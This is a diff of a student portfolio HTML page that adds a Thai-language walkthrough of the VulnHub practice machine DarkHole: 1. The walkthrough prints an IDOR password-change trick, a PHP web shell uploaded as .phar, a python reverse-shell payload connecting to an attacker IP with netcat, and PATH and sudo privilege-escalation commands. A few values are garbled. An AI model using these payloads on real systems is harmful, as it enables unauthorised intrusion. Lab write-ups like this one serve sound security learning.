@@ -1,151 +1,295 @@
 <!DOCTYPE html>
 <html lang="en-US">
-  <head>
-    <title>nunnaphut kiticha</title>
-    <link rel="icon" href="images/homepage/logo.png">
-    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="crossorigin"/>
-    <link rel="preload" as="style" href="https://fonts.googleapis.com/css2?family=Nunito+Sans:wght@300;400;700;800&amp;display=swap"/>
-    <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Nunito+Sans:wght@300;400;700;800&amp;display=swap" media="print" onload="this.media='all'"/>
-    <noscript>
-      <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Nunito+Sans:wght@300;400;700;800&amp;display=swap"/>
-    </noscript>
-    <link href="./css/font-awesome/css/all.min.css?ver=1.2.0" rel="stylesheet">
-    <link href="./css/bootstrap-icons/bootstrap-icons.css?ver=1.2.0" rel="stylesheet">
-    <link href="./css/bootstrap.min.css?ver=1.2.0" rel="stylesheet">
-    <link href="./css/aos.css?ver=1.2.0" rel="stylesheet">
-    <link href="./css/main.css?ver=1.2.0" rel="stylesheet">
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
-    <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/devicons/devicon@v2.15.1/devicon.min.css">
-    <noscript>
-      <style type="text/css">
-        [data-aos] {
-            opacity: 1 !important;
-            transform: translate(0) scale(1) !important;
-        }
-      </style>
-    </noscript>
-  </head>
-  <body id="top">
-    <header class="bg-light">
-      <nav class="navbar navbar-expand-lg navbar-light bg-light" id="header-nav" role="navigation">
-        <div class="container">
-          <h1 class="link-dark navbar-brand site-title mb-0" >Portfolio</h1>
-          <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarSupportedContent" aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
-            <span class="navbar-toggler-icon"></span>
-          </button>
-          <div class="collapse navbar-collapse" id="navbarSupportedContent">
-            <ul class="navbar-nav ms-auto me-2">
-              <li class="nav-item"><a class="nav-link" href="index.html">Home</a></li>
-            </ul>
-          </div>
-        </div>
-      </nav>
-    </header>
-    <div class="page-content">
-      <div id="content">
-        <!-- Header Part -->
-        <header>
-          <div class="cover bg-light">
-            <div class="container px-3">
-              <div class="row">
-                <div class="text-center">
-                    <h1 class="intro-title marker marker-center" data-aos="fade-left" data-aos-delay="50">DarkHole: 1</h1>
-                    <p class="lead fw-normal mt-3" data-aos="fade-up" data-aos-delay="100">Walkthrough how to hacking Virtual Machine name DarkHole: 1 in Vulnhub website</p>
-                </div>
-              </div>
-            </div>
-          </div>
-        </header>
 
-        <script>
-            let slideIndex = 1;
-            showSlides(slideIndex);
-            function plusSlides(n) {
-              showSlides(slideIndex += n);
-            }
-            function currentSlide(n) {
-              showSlides(slideIndex = n);
-            }
-            function showSlides(n) {
-              let i;
-              let slides = document.getElementsByClassName("mySlides");
-              let dots = document.getElementsByClassName("dot");
-              if (n > slides.length) {slideIndex = 1}    
-              if (n < 1) {slideIndex = slides.length}
-              for (i = 0; i < slides.length; i++) {
-                slides[i].style.display = "none";  
-              }
-              for (i = 0; i < dots.length; i++) {
-                dots[i].className = dots[i].className.replace(" active", "");
-              }
-              slides[slideIndex-1].style.display = "block";  
-              dots[slideIndex-1].className += " active";
-            }
-        </script>
-        <div class="fab" id="div1"></div>
-        <div class="container">
-            <div class="slideshow-container">
-                <figure class="portfolio-item mySlides fadeslide"><img src="images/experience/afs1.JPG" style="width: 100%;">
-                    <figcaption>
-                        <h4 class="h5 mb-0">AFS Intercultural Programs</h4>
-                        <div> 1 Year Exchange in Switzerland </div>
-                    </figcaption>
-                </figure>
-                <figure class="portfolio-item mySlides fadeslide"><img src="images/experience/42event1.jpg" style="width: 100%;">
-                    <figcaption>
-                        <h4 class="h5 mb-0">AFS Intercultural Programs</h4>
-                        <div> 1 Year Exchange in Switzerland </div>
-                    </figcaption>
-                </figure>
-  
-                <a class="prev" onclick="plusSlides(-1)">❮</a>
-                <a class="next" onclick="plusSlides(1)">❯</a>
-                <div style="text-align:center">
-                <br><span class="dot" onclick="currentSlide(1)"></span> 
-                <span class="dot" onclick="currentSlide(2)"></span> 
-                <span class="dot" onclick="currentSlide(3)"></span>
-                <span class="dot" onclick="currentSlide(4)"></span>
-                <span class="dot" onclick="currentSlide(5)"></span>
-                </div>
-            </div>
-        </div>
+<head>
+  <title>nunnaphut kiticha</title>
+  <link rel="icon" href="images/homepage/logo.png">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="crossorigin" />
+  <link rel="preload" as="style"
+    href="https://fonts.googleapis.com/css2?family=Nunito+Sans:wght@300;400;700;800&amp;display=swap" />
+  <link rel="stylesheet"
+    href="https://fonts.googleapis.com/css2?family=Nunito+Sans:wght@300;400;700;800&amp;display=swap" media="print"
+    onload="this.media='all'" />
+  <noscript>
+    <link rel="stylesheet"
+      href="https://fonts.googleapis.com/css2?family=Nunito+Sans:wght@300;400;700;800&amp;display=swap" />
+  </noscript>
+  <link href="./css/font-awesome/css/all.min.css?ver=1.2.0" rel="stylesheet">
+  <link href="./css/bootstrap-icons/bootstrap-icons.css?ver=1.2.0" rel="stylesheet">
+  <link href="./css/bootstrap.min.css?ver=1.2.0" rel="stylesheet">
+  <link href="./css/aos.css?ver=1.2.0" rel="stylesheet">
+  <link href="./css/main.css?ver=1.2.0" rel="stylesheet">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/devicons/devicon@v2.15.1/devicon.min.css">
+  <noscript>
+    <style type="text/css">
+      [data-aos] {
+        opacity: 1 !important;
+        transform: translate(0) scale(1) !important;
+      }
+    </style>
+  </noscript>
+</head>
 
-        <!-- Footer Part -->
-        <footer class="pt-4 pb-4 text-center bg-light">
-          <div class="container">
-            <hr style="color: black;">
-            <div class="my-3">
-              <div class="h4">Nunnaphut Kiticha</div>
-              <p>Computer Science student & 42Bangkok Cadet</p>
-              <div class="social-nav">
-                <nav role="navigation">
-                  <ul class="nav justify-content-center">
-                    <li class="nav-item"><a class="nav-link" target="_blank" href="https://github.com/NunnaphutK" title="Github"><i class="fab fa-github"></i><span class="menu-title sr-only">Github</span></a></li>
-                    <li class="nav-item"><a class="nav-link" target="_blank" href="https://www.linkedin.com/in/nunnaphut-kiticha-235a7a241/" title="Linkedin"><i class="fab fa-linkedin"></i><span class="menu-title sr-only">Facebook</span></a></li>
-                    <li class="nav-item"><a class="nav-link" target="_blank" href="https://www.instagram.com/nowni_14/" title="Instagram"><i class="fab fa-instagram"></i><span class="menu-title sr-only">Instagram</span></a></li>
-                  </ul>
-                </nav>
-              </div>
-            </div>
-            <div class="text-small text-secondary">
-              <div class="mb-1">&copy;nunnaphutK</div>
-              <div class="mb-1">-Portfolio-</div>
-            </div>
-          </div>
-        </footer>
+<body id="top">
+  <header class="bg-light">
+    <nav class="navbar navbar-expand-lg navbar-light bg-light" id="header-nav" role="navigation">
+      <div class="container">
+        <h1 class="link-dark navbar-brand site-title mb-0">Portfolio</h1>
+        <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarSupportedContent"
+          aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+          <span class="navbar-toggler-icon"></span>
+        </button>
+        <div class="collapse navbar-collapse" id="navbarSupportedContent">
+          <ul class="navbar-nav ms-auto me-2">
+            <li class="nav-item"><a class="nav-link" href="index.html">Home</a></li>
+          </ul>
+        </div>
       </div>
+    </nav>
+  </header>
+  <div class="page-content">
+    <div id="content">
+      <!-- Header Part -->
+      <header>
+        <div class="cover bg-light">
+          <div class="container px-3">
+            <div class="row">
+              <div class="text-center">
+                <h1 class="intro-title marker marker-center" data-aos="fade-left" data-aos-delay="50">DarkHole: 1</h1>
+                <p class="lead fw-normal mt-3" data-aos="fade-up" data-aos-delay="100">Walkthrough how to hacking
+                  Virtual Machine name DarkHole: 1 in Vulnhub website</p>
+              </div>
+            </div>
+          </div>
+        </div>
+      </header>
+      <div class="containerdh">
+        <article>
+          <figure class="portfolio-item slideshow-container"><img src="images/experience/darkhole1.png"
+              style="width: 100%;">
+            <figcaption>
+              <h4 class="h5 mb-0"></h4>
+              <div> Walkthrough how to hacking Virtual Machine name DarkHole: 1 in Vulnhub website</div>
+            </figcaption>
+          </figure><br>
+          <h2>DarkHole: 1</h2>
+          <p class="author">By: NunnaphutK</p>
+          <p class="date">Published on January 12, 2024</p>
+          <p class="author">Credit : <a href="https://www.vulnhub.com/entry/darkhole-1,724/" target="_blank">VulnHub -
+              DarkHole: 1</a></p><br>
+          <b>เครื่องมือที่ใช้</b>
+          <p><b>Virtual Machine DarkHole: 1</b><br>
+            Virtual Machine DarkHole:1 ใช้ OS ของ Linux โดยมีระดับความยากอยู่ที่ระดับง่ายสำหรับผู้เริ่มต้น
+            โดยสามารถดาวน์โหลดหรืออ่านรายละเอียดข้อมูลได้จากการค้นหาใน VulnHub ตามลิงก์ด้านล่างนี้<br>
+            <a href="https://www.vulnhub.com/entry/darkhole-1,724/">
+              <p style="text-align: center;">https://www.vulnhub.com/entry/darkhole-1,724/</p>
+            </a>
+            หรือสามารถดาวน์โหลดได้ตามลิงก์ด้านล่างนี้<br><br>
+            <a href="https://download.vulnhub.com/darkhole/DarkHole.zip">
+              <p style="text-align: center;">https://download.vulnhub.com/darkhole/DarkHole.zip</p>
+            </a>
+          </p>
+          <p><b>Burp Suite Community Edition</b><br>
+            Burp Suite Community Edition เป็นโปรแกรมที่ใช้สำหรับการทดสอบของเว็บแอปพลิเคชัน
+            โดยคุณลักษณะหลักของโปรแกรมนี้คือส่วนของ Proxy web โดยสามารถดักจับการส่ง Request จาก Client และ Response
+            ข้อมูลตอบกลับไปยัง Client โดยสามารถเลือกกระทำการใด ๆ กับข้อมูลนั้นก็ได้
+            แต่โปรแกรมนี้จะสามารถใช้งานได้เฉพาะบนเบราว์เซอร์ หรือ IP ของเครื่องผู้โจมตีเองเท่านั้น <br>
+            <img src="images/experience/afs1.jpg" style="width: 100%; margin: 10px;">
+          </p>
+          <b>ขั้นตอนการเจาะระบบ</b>
+          <p><b>- ขั้นตอนการตรวจสอบรายละเอียดของเครื่องเป้าหมาย</b><br>
+            1. ค้นหา IP Address ของเครื่องผู้โจมตีด้วยคำสั่ง ifconfig<br>
+            <img src="images/experience/afs1.jpg" style="width: 100%; margin: 10px;">
+            2. ทำการแสกน IP Address ที่มีการ Active อยู่ในเครือข่ายของเครื่องผู้โจมตี โดยกำหนดช่วงในการแสกนอยู่ที่ 24
+            หมายความว่าจะทำการแสกนตั้งแต่ IP 192.168.5.0 จนถึง 192.168.5.255 ด้วยคำสั่ง
+            <center>netdiscover<br>netdiscover -r 192.168.5.0/243</center>
+            <img src="images/experience/afs1.jpg" style="width: 100%; margin: 10px;">
+            จะได้ IP Address จำนวน 4 IP ได้แก่
+            <center>192.168.5.1<br>
+              192.168.5.2<br>
+              192.168.5.131<br>
+              192.168.5.2544</center>
+            3. ทำการแสกนหา IP Address ของเครื่องเป้าหมาย โดยจะเห็นว่า IP Address ของเครื่องเป้าหมายคือ 192.168.5.131
+            ซึ่งมี Port ที่เปิดอยู่ คือ Port 22 (Secure Shell) และ Port 80 (Hypertext Transfer Protocol)
+            โดยการทำขั้นตอนนี้ในแต่ละเครื่องผู้ใช้งานจะได้ IP Address ที่ไม่เหมือนกัน
+            <img src="images/experience/afs1.jpg" style="width: 100%; margin: 10px;">
+          </p>
+          <p><b>-ขั้นตอนการหาช่องโหว่และเชื่อมต่อเครื่องเป้าหมาย</b><br>
+            1. ทำการเปิดโปรแกรม Burp Suite Community Edition<br>
+            เลือก Temporary project แล้วกด Next จากนั้นเลือก Use Burp defaults แล้วกด Start<br>
+            2. เมื่อทำการเปิดโปรแกรมเรียบร้อยแล้วให้ทำการกดที่ Proxy จากนั้นกดที่ Open Browser เพื่อเปิดเบราว์เซอร์
+            <img src="images/experience/afs1.jpg" style="width: 100%; margin: 10px;">
+            3. เมื่อเปิดเบราว์เซอร์ผ่านโปรแกรมแล้ว ให้ทำการใส่ IP Address ของเครื่องเป้าหมาย
+            หลังจากนั้นจะแสดงหน้าจอเว็บไซต์ DarkHole
+            <img src="images/experience/afs1.jpg" style="width: 100%; margin: 10px;">
+            4. ทำการกด Login เพื่อเข้าสู่ระบบ ในขั้นตอนนี้หากยังไม่มีบัญชีผู้ใช้ ต้องทำการสมัครสมาชิกเป็นอย่างแรก
+            ให้ทำการคลิกที่ Sign up now จากนั้นทำการใส่ username email และ password
+            จากนั้นเข้าสู่ระบบโดยใช้ชื่อที่ได้ทำการสมัครไว้
+            <img src="images/experience/afs1.jpg" style="width: 100%; margin: 10px;">
+            <img src="images/experience/afs1.jpg" style="width: 100%; margin: 10px;">
+            <img src="images/experience/afs1.jpg" style="width: 100%; margin: 10px;">
+            5. เมื่อเข้าสู่ระบบ จะเห็นว่าผู้ใช้งานสามารถเปลี่ยนรหัสผ่านได้ โดยจุดนี้จะเป็นช่องโหว่ของ DarkHole
+            <img src="images/experience/afs1.jpg" style="width: 100%; margin: 10px;">
+            6. ทำการกด Intercept is off ให้เปลี่ยนเป็น Intercept is on จากนั้นให้ใส่ Password ที่ต้องการเปลี่ยน
+            จากนั้นกด Change
+            <img src="images/experience/afs1.jpg" style="width: 100%; margin: 10px;">
+            7. Password ที่ได้ทำการเปลี่ยนนั้นจะถูกส่งไปยังหน้า Proxy ของ Burp Suite โดยบรรทัดสุดท้ายจะเห็น ได้ว่า id
+            ของผู้ใช้งานเป็น 2 (หรืออาจจะเป็น id ที่มากกว่านั้น) ซึ่งหมายความว่า id ที่แรกนั้น อาจเป็น id ของ Admin
+            ให้ทำการแก้ไขหมายเลข ให้เป็นหมายเลข 1 ในบรรทัดสุดท้าย เพื่อทำการส่งรหัสผ่านที่ได้ทำการตั้งไว้
+            ให้ไปเปลี่ยนที่ id 1 แทน id ของผู้ใช้งาน เมื่อแก้ไขเสร็จเรียบร้อยให้ทำการกด Forward เพื่อส่งค่าไปยังเว็บ
+            DarkHole จากนั้นทำการกด Intercept is on ให้เป็น Intercept is off
+            <img src="images/experience/afs1.jpg" style="width: 100%; margin: 10px;">
+            8. ทำการเข้าระบบด้วย username ที่ชื่อว่า admin และรหัสผ่านที่ได้ทำการเปลี่ยนในขั้นตอนก่อนหน้า
+            จะสามารถเข้าสู่ระบบของ Admin ได้ ซึ่งหน้าของ Admin จะต่างจากหน้าผู้ใช้งานปกติ ตรงที่สามารถอัพโหลดไฟล์ได้
+            ทำให้สามารถใช้ช่องโหว่นี้ในการอัพโหลดไฟล์ลงเครื่องเป้าหมายได้
+            <img src="images/experience/afs1.jpg" style="width: 100%; margin: 10px;">
+            <img src="images/experience/afs1.jpg" style="width: 100%; margin: 10px;">
+            9. ทำการสร้างไฟล์ด้วยนามสกุล shell.php เพื่อดำเนินการ Reverse Shell บนเครื่องเป้าหมายผ่านเบราว์เซอร์
+            โดยเขียนเนื้อหาในไฟล์ตามด้านล่างนี้
+            <center>&lt;?php if(isset($_REQUEST[‘cmd’])){ echo “&lt;pre>”;<br>
+              $cmd = ($_REQUEST[‘cmd’]); system($cmd);<br>
+              echo “&lt;/pre>”; die; }?></center><br>
+            จากนั้นทำการอัพโหลดลงเว็บไซต์ DarkHole โดยคลิกที่ปุ่ม Choose File จากนั้นเลือกไฟล์ shell.php ที่ได้สร้างไว้
+            <img src="images/experience/afs1.jpg" style="width: 100%; margin: 10px;">
+            10. เมื่อทำการเลือกไฟล์เสร็จเรียบร้อยแล้ว ให้เปลี่ยนเป็น Intercept is on ใน Burp Suite และกดปุ่ม Upload
+            ไฟล์ที่ได้ทำการโหลดจะมาแสดงอยู่ในโปรแกรม เปลี่ยนนามสกุลไฟล์ shell.php ให้เป็น shell.phar
+            ซึ่งเป็นนามสกุลที่รวมไฟล์ .php คล้ายกับ .zip เพราะเว็บไซต์ไม่ยอมรับไฟล์ .php จากนั้นให้แก้ไขเครื่องหมาย “”
+            และ ‘’ ให้เป็น "" และ ''
+            เนื่องจากหากแก้ไขในเครื่องผู้โจมตีจะทำให้เครื่องคอมพิวเตอร์มองว่าเป็นไฟล์อันตรายและลบทิ้ง
+            เมื่อเสร็จเรียบร้อยให้ทำการกด Forward และทำการเปลี่ยนเป็น Intercept is off ไฟล์ที่ถูกอัพโหลดจะไปอยู่ที่
+            upload/shell.phar ในส่วนของ Response บรรทัดที่ 57
+            <img src="images/experience/afs1.jpg" style="width: 100%; margin: 10px;">
+            <img src="images/experience/afs1.jpg" style="width: 100%; margin: 10px;">
+            11. ทำการตรวจสอบว่าอัพโหลดไฟล์สำเร็จหรือไม่ โดยการไปยังหน้า upload
+            <center>192.168.5.131/upload</center>
+            <img src="images/experience/afs1.jpg" style="width: 100%; margin: 10px;">
+
+            12. ใช้คำสั่ง netcat เพื่อเชื่อมต่อไปยัง Port 1234 โดยใช้คำสั่ง listening verbose port 1234
+            โดยให้เครื่องผู้โจมตีเป็นตัว listening หรือการทำ Reverse Shell
+            <center>nc -lvp 1234</center>
+            <img src="images/experience/afs1.jpg" style="width: 100%; margin: 10px;">
+
+            13. ใส่คำสั่งด้านล่างลงบนเบราว์เซอร์เพื่อ Reverse Shell โดยตัวอักษรสีแดง
+            แรกเป็น IP Address ของเครื่องเป้าหมาย ต่อมาเป็น IP Address ของเครื่องผู้โจมตี และสุดท้ายคือ Port
+            ที่เชื่อมต่อตามลำดับ
+            <center>http://192.168.5.131/upload/shell.phar?cmd=python3%20-
+              c%20%27import%20socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_S
+              TREAM);s.connect((%22192.168.5.132%22,1234));os.dup2(s.fileno(),0);%20os.dup2(s.fileno()
+              ,1);%20os.dup2(s.fileno(),2);p=subprocess.call([%22/bin/sh%22,%22-i%22]);%27</center>
+            <img src="images/experience/afs1.jpg" style="width: 100%; margin: 10px;">
+            <img src="images/experience/afs1.jpg" style="width: 100%; margin: 10px;">
+
+            14. ใช้ python เขียนคำสั่งในการเปลี่ยน shell ปกติเป็น interactive shell ที่เป็น shell
+            ที่ใช้เพื่อพิมพ์คำสั่งและรับ output กลับมาจากคำสั่งนั้น ๆ และใช้คำสั่ง whoami
+            เพื่อดูว่าผู้ใช้งานตอนนี้คือใคร ซึ่งตอนนี้ยังเป็น www-data
+            <center>python3 -c ‘import pty;pty.spawn(“/bin/bash”)’<br>
+              whoami14</center>
+            <img src="images/experience/afs1.jpg" style="width: 100%; margin: 10px;">
+
+            15. ลิสต์เพื่อดูโฟลเดอร์ที่อยู่ข้างในด้วยคำสั่ง ls เปลี่ยน directory ไปยังโฟลเดอร์ root ด้วยคำสั่ง cd
+            จะมีข้อความขึ้นว่า Permission denied ซึ่งแสดงว่ายังไม่สามารถเข้าถึงโฟลเดอร์ root ได้
+            <center>ls<br>cd /root</center>
+            <img src="images/experience/afs1.jpg" style="width: 100%; margin: 10px;">
+
+            16. เปลี่ยน directory ไปยังโฟลเดอร์ home/john ด้วยคำสั่ง cd และอ่านไฟล์ password ด้วยคำสั่ง cat
+            จะเห็นข้อความ Permission denied แสดงว่ายังไม่สามารถอ่านไฟล์ password ได้
+            จึงจำเป็นต้องทำการยกระดับสิทธิ์ให้เป็น john
+            <center>cd /home/john<br>cat password</center>
+            <img src="images/experience/afs1.jpg" style="width: 100%; margin: 10px;">
+          </p>
+          <p><b>-ขั้นตอนการเปลี่ยนสิทธิ์เป็น john</b><br>
+            1. ทำการไปยังโฟลเดอร์ชั่วคราว (temp) ด้วยคำสั่ง cd และทำการสร้างไฟล์ชื่อ id และเพิ่มข้อความ /bin/bash
+            ซึ่งเป็นตัวนำทาง ด้วยคำสั่ง echo จากนั้นทำการใช้คำสั่ง chmod เพื่อให้สิทธิ์ในการเรียกใช้งานไฟล์ id โดยใช้ +x
+            เป็นตัว execute และทำการกกำหนด Path ไปยังโฟลเดอร์ tmp
+            <center>cd /tmp<br>
+              echo “/bin/bash” > id<br>
+              chmod +x id<br>
+              PATH=/tmp:$PATH</center><br>
+            <img src="images/experience/afs1.jpg" style="width: 100%; margin: 10px;">
+            2. ทำการยกระดับสิทธิ์เป็น john ด้วยคำสั่ง ./toto และตรวจสอบว่าผู้ใช้งานที่กกำลังใช้งานอยู่คือใครด้วยคำสั่ง
+            whoami ในตอนนี้แสดงให้เห็นว่าผู้ใช้งานในตอนนี้คือ john
+            <center>./toto<br>
+              whoami</center>
+            <img src="images/experience/afs1.jpg" style="width: 100%; margin: 10px;">
+            3. ทำการลิสต์ ls ในโฟลเดอร์ /home/john เพื่อดูว่ามีไฟล์อะไรอยู่ข้างในบ้าง จากนั้นทำการอ่านไฟล์ user.txt
+            ด้วยคำสั่ง cat จะได้ข้อความที่เป็น Flag1 คือ DarkHole{You_Can_Do_It} จากนั้นทำการอ่านไฟล์ password
+            ด้วยคำสั่ง cat ซึ่งจะได้รหัสเป็น root123
+            <center>ls<br>
+              cat user.txt<br>
+              cat password</center>
+            <img src="images/experience/afs1.jpg" style="width: 100%; margin: 10px;">
+          </p>
+          <p><b>-ขั้นตอนการเปลี่ยนสิทธิ์เป็น root</b><br>
+            1. ทำการใช้คำสั่ง sudo -l เพื่อแสดงรายการสิทธิ์ที่ผู้ใช้งาน john สามารถเข้าถึงได้
+            จากนั้นจะมีข้อความถามรหัสผ่านของ john ให้ทำการใส่รหัสผ่าน root123 ที่ได้จากการอ่านไฟล์ในขั้นตอนก่อนหน้า
+            จะมีการแสดงผลว่าพบไฟล์ file.py ใน directory ที่ผู้ใช้งาน john สามารถรันในระดับสิทธิ์ root ได้
+            ดังนั้นจะทำการแก้ไข file.py เพื่อยกระดับสิทธิ์เป็น root
+            <center>sudo -l<br>
+              root123</center>
+            <img src="images/experience/afs1.jpg" style="width: 100%; margin: 10px;">
+            2. ทำการเขียนข้อความ import os;os.system(“/bin/bash”) ลงในไฟล์ file.py ด้วยคำสั่ง echo
+            เพื่อให้สามารถรันคำสั่งผ่าน command ได้
+            <center>echo ‘import os;os.system(“/bin/bash”)’ > file.py</center>
+            <img src="images/experience/afs1.jpg" style="width: 100%; margin: 10px;">
+
+            3. ทำการยกระดับสิทธิ์เป็น root ด้วยคำสั่ง sudo ตามด้วยไฟล์ที่ผู้ใช้งาน john สามารถรันได้ในระดับสิทธิ์ root
+            ดังภาพที่ 2.28 ที่ได้ทำการแก้ไขไฟล์ file.py เรียบร้อยแล้ว จากนั้นทำการเปลี่ยน directory ไปยัง root
+            ด้วยคำสั่ง cd ทำการอ่านไฟล์ root.txt ด้วยคำสั่ง cat จะแสดงข้อความที่เป็น Flag2 ว่า DarkHole{You_Are_Legend}
+            และทำการตรวจสอบตรวจสอบว่าผู้ใช้งานที่กกำลังใช้งานอยู่คือใครด้วยคำสั่ง whoami
+            ซึ่งแสดงให้เห็นว่าในขั้นตอนนี้ผู้ใช้งานที่กกำลังใช้งานอยู่คือ root
+            <center>sudo /usr/bin/python3 /home/john/file.py<br>
+              cd /root<br>
+              cat root.txt<br>
+              whoami</center>
+            <img src="images/experience/afs1.jpg" style="width: 100%; margin: 10px;">
+          </p>
+        </article>
+      </div>
+
+      <!-- Footer Part -->
+      <footer class="pt-4 pb-4 text-center bg-light">
+        <div class="container">
+          <hr style="color: black;">
+          <div class="my-3">
+            <div class="h4">Nunnaphut Kiticha</div>
+            <p>Computer Science student & 42Bangkok Cadet</p>
+            <div class="social-nav">
+              <nav role="navigation">
+                <ul class="nav justify-content-center">
+                  <li class="nav-item"><a class="nav-link" target="_blank" href="https://github.com/NunnaphutK"
+                      title="Github"><i class="fab fa-github"></i><span class="menu-title sr-only">Github</span></a>
+                  </li>
+                  <li class="nav-item"><a class="nav-link" target="_blank"
+                      href="https://www.linkedin.com/in/nunnaphut-kiticha-235a7a241/" title="Linkedin"><i
+                        class="fab fa-linkedin"></i><span class="menu-title sr-only">Facebook</span></a></li>
+                  <li class="nav-item"><a class="nav-link" target="_blank" href="https://www.instagram.com/nowni_14/"
+                      title="Instagram"><i class="fab fa-instagram"></i><span
+                        class="menu-title sr-only">Instagram</span></a></li>
+                </ul>
+              </nav>
+            </div>
+          </div>
+          <div class="text-small text-secondary">
+            <div class="mb-1">&copy;nunnaphutK</div>
+            <div class="mb-1">-Portfolio-</div>
+          </div>
+        </div>
+      </footer>
     </div>
-    <div id="scrolltop">
-      <a class="btn btn-secondary" href="#top">
-        <span class="icon"><i class="fas fa-angle-up fa-x"></i></span>
-      </a>
-    </div>
-    <script src="./scripts/imagesloaded.pkgd.min.js?ver=1.2.0"></script>
-    <script src="./scripts/masonry.pkgd.min.js?ver=1.2.0"></script>
-    <script src="./scripts/BigPicture.min.js?ver=1.2.0"></script>
-    <script src="./scripts/purecounter.min.js?ver=1.2.0"></script>
-    <script src="./scripts/bootstrap.bundle.min.js?ver=1.2.0"></script>
-    <script src="./scripts/aos.min.js?ver=1.2.0"></script>
-    <script src="./scripts/main.js?ver=1.2.0"></script>
-  </body>
+  </div>
+  <div id="scrolltop">
+    <a class="btn btn-secondary" href="#top">
+      <span class="icon"><i class="fas fa-angle-up fa-x"></i></span>
+    </a>
+  </div>
+  <script src="./scripts/imagesloaded.pkgd.min.js?ver=1.2.0"></script>
+  <script src="./scripts/masonry.pkgd.min.js?ver=1.2.0"></script>
+  <script src="./scripts/BigPicture.min.js?ver=1.2.0"></script>
+  <script src="./scripts/purecounter.min.js?ver=1.2.0"></script>
+  <script src="./scripts/bootstrap.bundle.min.js?ver=1.2.0"></script>
+  <script src="./scripts/aos.min.js?ver=1.2.0"></script>
+  <script src="./scripts/main.js?ver=1.2.0"></script>
+</body>
+
 </html>
